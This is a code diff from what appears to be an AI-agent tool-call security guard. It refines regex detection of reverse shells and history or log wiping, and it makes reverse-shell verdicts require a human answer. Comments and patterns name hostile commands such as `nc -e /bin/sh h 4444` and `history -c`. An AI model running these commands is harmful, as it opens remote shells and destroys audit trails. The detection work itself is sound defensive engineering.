(?:bash|sh|zsh|dash|ksh|ash))(?=[\s;&|)<>]|\\\r?\n|(?![\s\S]))(?:(?!(?<![^\\]\\)(?<![\d<>&])(?:0?<&|0>&)(?:[3-9]|[1-9]\d+|\$\{?\w+\}?)(?!\w))(?:[^\n;&|"'`()\\]|(?<!\\)\\[^\r\n]|(?<!\\)\\\r?\n|(?<=[<>])&|(?<![<>])&(?=>)))*(?<![^\\]\\)(?<![\d<>&])(?:0?<&|0>&)(?:[3-9]|[1-9]\d+|\$\{?\w+\}?)(?!\w)|\$\{?\w+\}?(?=[\s;&|)<>]|\\\r?\n|(?![\s\S]))(?:(?!(?<![^\\]\\)(?<![\d<>&])(?:[12]?>&|&>)(?:[3-9]|[1-9]\d+|\$\{?\w+\}?)(?!\w))(?:[^\n;&|"'`()\\]|(?<!\\)\\[^\r\n]|(?<!\\)\\\r?\n|(?<=[<>])&|(?<![<>])&(?=>)))*(?<![^\\]\\)(?<![\d<>&])(?:[12]?>&|&>)(?:[3-9]|[1-9]\d+|\$\{?\w+\}?)(?!\w)|eval(?=[\s;&|)<>]|\\\r?\n|(?![\s\S]))(?:(?!(?<![^\\]\\)(?<![\d<>&])(?:[12]?>&|&>)(?:[3-9]|[1-9]\d+|\$\{?\w+\}?)(?!\w))(?:(?:[^\n;&|"'`()\\]|(?<!\\)\\[^\r\n]|(?<!\\)\\\r?\n|(?<=[<>])&|(?<![<>])&(?=>))|"\$\{?\w+\}?"))*(?<![^\\]\\)(?<![\d<>&])(?:[12]?>&|&>)(?:[3-9]|[1-9]\d+|\$\{?\w+\}?)(?!\w))|(?<![^\\]\\)(?<![\d<>&])(?:0?<&|0>&)(?:[3-9]|[1-9]\d+|\$\{?\w+\}?)(?!\w)(?:(?!(?<![^\\]\\)(?<![\d<>&])(?:0?<&|0>&)(?:[3-9]|[1-9]\d+|\$\{?\w+\}?)(?!\w))(?:[^\n;&|"'`()\\]|(?<!\\)\\[^\r\n]|(?<!\\)\\\r?\n|(?<=[<>])&|(?<![<>])&(?=>)))*[^\S\n]*\|(?!\|)[^\S\n]*(?:'(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash)'|"(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash)"|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash))(?=[\s;&|)<>]|\\\r?\n|(?![\s\S])))/, signal: 'reverse-shell', dataQuotes: true, inertComments: true },
   { re: /\bhistory\s+-c\b|\.bash_history|truncate\b[^|\n]*\.log/i, signal: 'wipe-history-or-logs' },
   // #505: `.ssh` behind any home root + `authorized_keys` as a path segment — mirrors the guard row.
   // #1005: plus the named credential stores (the guard's CREDENTIAL_STORE_PATH_SRC, alternative for alternative).
@@ -1073,19 +1075,38 @@ const FALLBACK_EXEC_WORD_RE = /^(?:bash|sh|zsh|ksh|dash|ash|python[\d.]*|node|no
 const FALLBACK_UNSAFE_PIPE_RE = /(?<!\|)\|(?!\|)&?(?![ \t]*(?:grep|egrep|fgrep|zgrep|rg|ag|ack|head|tail|less|more|wc|sort|uniq|cut|tr|jq|cat|tee|column|nl|fold|fmt)(?:[ \t\n|;&)]|$))/;
 /** Syntax whose quotes the walk below would mis-pair: ANSI-C `$'…'`, a heredoc, `${…}`. */
 const FALLBACK_QUOTE_UNMODELLED_RE = /\$'|<<|\$\{/;
-/** A `#` after one of these (or at the start) opens a comment. */
-const FALLBACK_WORD_BREAK = ' \t\n\r\v\f;&|()<>';
+/** #1088 r3: a `#` after one of these, or at the start of the text, certainly opens a comment: bash's
+ *  blanks and its operator characters, but not `)`, which ends a `$(…)` word as well as a subshell
+ *  (`echo $(x)#y` is one word), and not VT, CR or FF, which bash does not break words on. */
+const FALLBACK_WORD_BREAK = ' \t\n;&|(<>';
+/** A `#` after one of these might open a comment. The data-quote walk trusts no quote when one
+ *  might, so it reads the wider set and fails closed (`(x)# --text '…` is a comment after a subshell). */
+const FALLBACK_MAYBE_COMMENT_BREAK = ' \t\n\r\v\f;&|()<>';
+/** #1088 r3: where the comment blanker stops for good, matched at each position outside single quotes:
+ *  syntax it does not model, inside which bash reads a `#` after a blank or `|` as text, or whose quotes
+ *  it would mis-pair — `$(`, `$[`, `${`, `$'`, a backtick, a heredoc, a line continuation, `((`
+ *  (`(( 1 |#b ))`), `[[` (`[[ a =~ (a|#b) ]]`) and an extglob group (`@(a|#b)`). */
+const FALLBACK_COMMENT_UNMODELLED_RE = /\$[('{\[]|`|<<|\\\r?\n|[?*+@!]\(|\(\(|\[\[/y;
 /** A command word further back than this from its own quote is not recognised (the quote stays executed). */
 const FALLBACK_QUOTE_PREFIX_CAP = 512;
 /** Inert matches looked past before the row fails closed. */
 const FALLBACK_INERT_MATCH_CAP = 64;
+/** #1088 r5b (Jarvis B1): the rows whose data quotes are also read through an `env [-i] [NAME=VAL…]`
+ *  prefix (`env FOO=1 printf 'nc -e …'` is a mention). Every other row reads the command word as before
+ *  #1005. Mirrors the guard's ENV_DATA_QUOTE_SIGNALS. */
+const FALLBACK_ENV_DATA_QUOTE_SIGNALS: readonly string[] = ['reverse-shell'];
 
-/** `[open, close + 1)` of every quoted data argument, or [] when none can be trusted. */
-function fallbackDataQuoteRanges(text: string): Array<[number, number]> {
-  if (FALLBACK_NESTED_EXEC_RE.test(text) || FALLBACK_QUOTE_UNMODELLED_RE.test(text)) return [];
+/** `[open, close + 1)` of every quoted data argument, or [] when none can be trusted. `envPrefix` also
+ *  reads the command word through `env [-i] [NAME=VAL…]` (FALLBACK_ENV_DATA_QUOTE_SIGNALS rows only). */
+function fallbackDataQuoteRanges(text: string, envPrefix = false): Array<[number, number]> {
+  if (FALLBACK_QUOTE_UNMODELLED_RE.test(text)) return [];
   const ranges: Array<[number, number]> = [];
   // Quote contents blanked, so the pipe check below never reads quoted text.
   let unquoted = '';
+  // #1005 review B3 (astra): only single-quote contents blanked, for the nested-exec
+  // check — a backtick or `$(` inside '…' is literal (`--body 'use `nc -e` never'`),
+  // inside "…" or bare it runs. An unclosed '…' is read raw.
+  let live = '';
   let q: string | null = null;
   let open = -1;
   let stmtStart = 0;
@@ -1093,13 +1114,16 @@ function fallbackDataQuoteRanges(text: string): Array<[number, number]> {
   for (let i = 0; i < text.length; i++) {
     const c = text[i];
     // Bash escaping: `\` escapes the next char outside quotes and inside "…".
-    if (c === '\\' && q !== "'") { unquoted += q ? '  ' : text.slice(i, i + 2); i++; continue; }
+    if (c === '\\' && q !== "'") { unquoted += q ? '  ' : text.slice(i, i + 2); live += text.slice(i, i + 2); i++; continue; }
     if (q) {
       unquoted += ' ';
+      live += q === "'" ? ' ' : c;
       if (c !== q) continue;
       const prefix = text.slice(stmtStart, open);
       if (open - stmtStart <= FALLBACK_QUOTE_PREFIX_CAP) {
-        const bare = prefix.replace(/^\s+/, '').replace(/^(?:\w+=\S*\s+)*/, '').replace(/^(?:sudo|doas)\s+/, '');
+        let bare = prefix.replace(/^\s+/, '').replace(/^(?:\w+=\S*\s+)*/, '').replace(/^(?:sudo|doas)\s+/, '');
+        // #1088 r5b: read through `env [-i] [NAME=VAL…]` only for FALLBACK_ENV_DATA_QUOTE_SIGNALS rows.
+        if (envPrefix) bare = bare.replace(/^env\s+(?:-i\s+|\w+=\S*\s+)*/, '');
         const isAssignment = /(?:^|\s)(?:export\s+|local\s+|declare\s+\S+\s+)?\w+(?:\[[^\]]*\])?\+?=$/.test(prefix);
         const word = bare.split(/\s+/)[0] ?? '';
         if (!isAssignment && (FALLBACK_DATA_COMMAND_RE.test(bare)
@@ -1111,9 +1135,10 @@ function fallbackDataQuoteRanges(text: string): Array<[number, number]> {
       continue;
     }
     unquoted += c;
+    live += c;
     if (c === '"' || c === "'") { q = c; open = i; continue; }
     if (c === ';' || c === '\n' || c === '|' || c === '&' || c === '(') stmtStart = i + 1;
-    else if (c === '#' && i >= commentCheckedTo && (i === 0 || FALLBACK_WORD_BREAK.includes(text[i - 1]))) {
+    else if (c === '#' && i >= commentCheckedTo && (i === 0 || FALLBACK_MAYBE_COMMENT_BREAK.includes(text[i - 1]))) {
       // A comment runs to the end of the line, and a quote in it is no quote
       // to the shell. Rather than model it (a `\ #` is not one), trust no
       // quote at all when one is there. Kept walking either way.
@@ -1123,11 +1148,70 @@ function fallbackDataQuoteRanges(text: string): Array<[number, number]> {
       if (line.includes('"') || line.includes("'")) return [];
     }
   }
-  return FALLBACK_UNSAFE_PIPE_RE.test(unquoted) ? [] : ranges;
+  if (q === "'") live += text.slice(open);
+  return FALLBACK_NESTED_EXEC_RE.test(live) || FALLBACK_UNSAFE_PIPE_RE.test(unquoted) ? [] : ranges;
 }
 
-/** True when `re` matches somewhere outside a quoted data argument (and `accept`, if given, takes its end). */
-function fallbackExecutedMatch(re: RegExp, text: string, accept?: (end: number) => boolean): boolean {
+/**
+ * #1005 review r2 B2: `text` with every shell comment blanked to spaces, length
+ * and newlines kept, so a row tagged `inertComments` never starts in one. The
+ * guard drops comments before its rows run (`stripComments`); a `# docs: 'nc -e'`
+ * line runs nothing, and the next line is still read.
+ * #1088 r3: fail closed, since text blanked here is text the row never reads. A
+ * `#` is blanked, to the end of its line, only where bash certainly starts a
+ * comment: unquoted, unescaped, and at the start of the text or right after a
+ * FALLBACK_WORD_BREAK character (`echo $(true)#; nc …` and `;\v#; nc …` keep the
+ * nc). From the first FALLBACK_COMMENT_UNMODELLED_RE construct outside single
+ * quotes and outside a comment, nothing more is blanked (that line and every
+ * line after it), and an unclosed quote blanks nothing after it. A missed
+ * comment can only make the fallback stricter.
+ * #1088 r4: blanking also stops for good, keeping the rest of the text, at
+ *  - a `#` inside an unclosed `[`: an array subscript keeps a `#` as data after
+ *    a blank or a newline (`declare -A a; a[ #]=v` stores the key ` #` and runs
+ *    the rest of the line). The depth counts every unquoted, unescaped `[` and
+ *    `]`, floored at 0 (a subscript, a `[` test or a glob alike), so it is never
+ *    below bash's subscript depth;
+ *  - the first unquoted newline that ends a line holding anything but blanks and
+ *    a comment. An alias defined there (`alias q='a['`, or by `eval`, `source`,
+ *    `$x` …) applies from the next line on, and its text can turn a later `#`
+ *    into data (`q #]=1; nc …`). Bash reads a whole line before running any of
+ *    it, so no alias defined in the text reaches a `#` blanked here.
+ */
+function fallbackBlankComments(text: string): string {
+  let out = '';
+  let q: string | null = null;
+  let escEnd = -1;    // index just past the last `\x` pair: a `#` there follows an escaped character
+  let depth = 0;      // unclosed `[` outside quotes
+  let code = false;   // this line holds more than blanks and a comment
+  for (let i = 0; i < text.length; i++) {
+    if (q !== "'") {
+      FALLBACK_COMMENT_UNMODELLED_RE.lastIndex = i;
+      if (FALLBACK_COMMENT_UNMODELLED_RE.test(text)) return out + text.slice(i);
+    }
+    const c = text[i];
+    if (c === '\\' && q !== "'") { out += text.slice(i, i + 2); escEnd = i + 2; code = true; i++; continue; }
+    if (q) { out += c; if (c === q) q = null; continue; }
+    if (c === '\n' && code) return out + text.slice(i);
+    if (c === '#' && (i === 0 || (i !== escEnd && FALLBACK_WORD_BREAK.includes(text[i - 1])))) {
+      if (depth > 0) return out + text.slice(i);
+      const eol = text.indexOf('\n', i);
+      const end = eol < 0 ? text.length : eol;
+      out += ' '.repeat(end - i);
+      i = end - 1;
+      continue;
+    }
+    if (c !== ' ' && c !== '\t' && c !== '\n') code = true;
+    if (c === '"' || c === "'") q = c;
+    else if (c === '[') depth++;
+    else if (c === ']' && depth > 0) depth--;
+    out += c;
+  }
+  return out;
+}
+
+/** True when `re` matches somewhere outside a quoted data argument (and `accept`, if given, takes its end).
+ *  `envPrefix`: the row is in FALLBACK_ENV_DATA_QUOTE_SIGNALS. */
+function fallbackExecutedMatch(re: RegExp, text: string, accept?: (end: number) => boolean, envPrefix = false): boolean {
   const g = new RegExp(re.source, re.flags.replace('g', '') + 'g');
   let ranges: Array<[number, number]> | null = null;
   let inert = 0;
@@ -1135,7 +1219,7 @@ function fallbackExecutedMatch(re: RegExp, text: string, accept?: (end: number) 
     g.lastIndex = from;
     const m = text.matchAll(g).next().value;   // matchAll starts at lastIndex
     if (!m) return false;
-    ranges ??= fallbackDataQuoteRanges(text);
+    ranges ??= fallbackDataQuoteRanges(text, envPrefix);
     const start = m.index ?? 0;
     const end = start + m[0].length;
     if (!ranges.some(([a, b]) => start >= a && end <= b) && (!accept || accept(end))) return true;
@@ -1186,10 +1270,12 @@ function fallbackDangerousMatch(args: Record<string, unknown> | undefined, toolN
   const text = fallbackExecSurface(args);
   if (!text) return null;
   const lockReadOnly = fallbackLockPathAccessIsReadOnly(text, toolName);
-  for (const { re, signal, lockPath, dataQuotes, postureTail } of FALLBACK_DANGEROUS_PATTERNS) {
+  for (const { re, signal, lockPath, dataQuotes, postureTail, inertComments } of FALLBACK_DANGEROUS_PATTERNS) {
     if (lockReadOnly && lockPath === true) continue;
     if (postureTail === true ? fallbackPostureMatch(re, text)
-      : dataQuotes === true ? fallbackExecutedMatch(re, text) : re.test(text)) return signal;
+      : dataQuotes === true ? fallbackExecutedMatch(re, inertComments === true ? fallbackBlankComments(text) : text,
+        undefined, FALLBACK_ENV_DATA_QUOTE_SIGNALS.includes(signal))
+      : re.test(text)) return signal;
   }
   return null;
 }
@@ -1202,6 +1288,17 @@ export const SELF_PROTECTION_SIGNALS: readonly string[] = ['touch-approval-store
 
 function isSelfProtectionVerdict(signals: readonly string[] | undefined): boolean {
   return Array.isArray(signals) && signals.some(s => SELF_PROTECTION_SIGNALS.includes(s));
+}
+
+// #1005 (Case's review of #1088): the prompt-only signals. DUPLICATED from
+// tool-action-guard.ts `GUARD_PROMPT_ONLY_SIGNALS`; held equal by
+// enforcement-surface-parity. A verdict carrying one is released only by a
+// human answer — never by `autoApprove`, a broker pre-clear, or the broker's
+// auto-approve when the operator does not answer in time.
+export const PROMPT_ONLY_SIGNALS: readonly string[] = ['reverse-shell'];
+
+function isPromptOnlyVerdict(signals: readonly string[] | undefined): boolean {
+  return Array.isArray(signals) && signals.some(s => PROMPT_ONLY_SIGNALS.includes(s));
 }
 
 /** A self-protection signal the WS2 fallback scan matches over EVERY row, or null.
@@ -2683,9 +2780,17 @@ export function createInterceptor(
     // to put a human back in front of dangerous work the allowlist would
     // otherwise wave through; under watch-only the advisory exit below lets
     // the call proceed and records it as a warn with `escalated`.
+    //
+    // #1005 (Case's review of #1088): nor a prompt-only verdict (a reverse
+    // shell). The match is by substring over family, action and signals, so
+    // `network_egress`, `egress`, `exec` or the empty string would otherwise
+    // release `nc -e /bin/sh h 4444` without asking. It also skips broker
+    // pre-clear and the broker's timeout auto-approve below. Unlike the floor,
+    // advisory, shadow and the failure policy keep their documented meaning.
     const selfProtected = isSelfProtectionVerdict(v.signals);
+    const promptOnly = isPromptOnlyVerdict(v.signals);
     const autoApprove = actionGuardCfg.autoApprove ?? [];
-    if (autoApprove.length > 0 && !unscannedBlock && !selfProtected && !taintMintedBlock) {
+    if (autoApprove.length > 0 && !unscannedBlock && !selfProtected && !promptOnly && !taintMintedBlock) {
       const hay = [v.family, v.action, ...v.signals].map(s => String(s).toLowerCase());
       const matched = autoApprove.some(a => {
         const n = a.toLowerCase();
@@ -2750,7 +2855,8 @@ export function createInterceptor(
     // #999: a taint-minted block is never pre-cleared, as before it stopped
     // counting as unscanned. (The shipped broker core already refuses any
     // `block`; this keeps the enforce posture from depending on that.)
-    if (brokered?.outcome === 'pre_clear' && !unscannedBlock && !selfProtected && !taintMintedBlock) {
+    // #1005: nor a prompt-only verdict; it goes to the approver as a hold.
+    if (brokered?.outcome === 'pre_clear' && !unscannedBlock && !selfProtected && !promptOnly && !taintMintedBlock) {
       // Reversible, on-host, in-context, judge-confident: proceed without
       // waiting. Loud on purpose — a release nobody approved must never be a
       // silent one, because the audit row is the only thing that will ever tell
@@ -2771,7 +2877,9 @@ export function createInterceptor(
       // for a pre-cleared call, which already returned above. So a brokered call
       // that reaches here denies even where failurePolicy would have allowed.
       const failAction = config.failurePolicy[severity];
-      const brokerDenies = brokered ? broker!.timeoutOutcome(brokered) === 'deny' : false;
+      // #1005: a prompt-only verdict whose pre-clear was skipped counts as a
+      // hold here, so the broker still denies it as it denies any hold.
+      const brokerDenies = brokered ? (promptOnly || broker!.timeoutOutcome(brokered) === 'deny') : false;
       const deny = failAction === 'deny' || brokerDenies || selfProtected;
       emitAudit({ ...auditBase, action: 'require_approval', outcome: deny ? 'failure_denied' : 'failure_allowed' }, call);
       // #509: no approver means the decision was put to no human — for
@@ -2846,7 +2954,8 @@ export function createInterceptor(
         // broker already pre-cleared — and that returned long before here — so
         // in practice this is always a deny. It reads the broker's own derived
         // flag rather than re-deriving its own idea of what is safe.
-        const outcome = selfProtected ? 'deny' : broker!.timeoutOutcome(brokered);
+        // #1005: a prompt-only verdict is never approved by silence either.
+        const outcome = selfProtected || promptOnly ? 'deny' : broker!.timeoutOutcome(brokered);
         emitAudit({ ...auditBase, action: 'require_approval', outcome: outcome === 'approve' ? 'approved' : 'auto_denied' }, call);
         if (outcome === 'approve') {
           log.warn(`[shieldcortex] approval broker: no answer in ${err.timeoutMs}ms — auto-approving pre-cleared ${context.toolName}`);
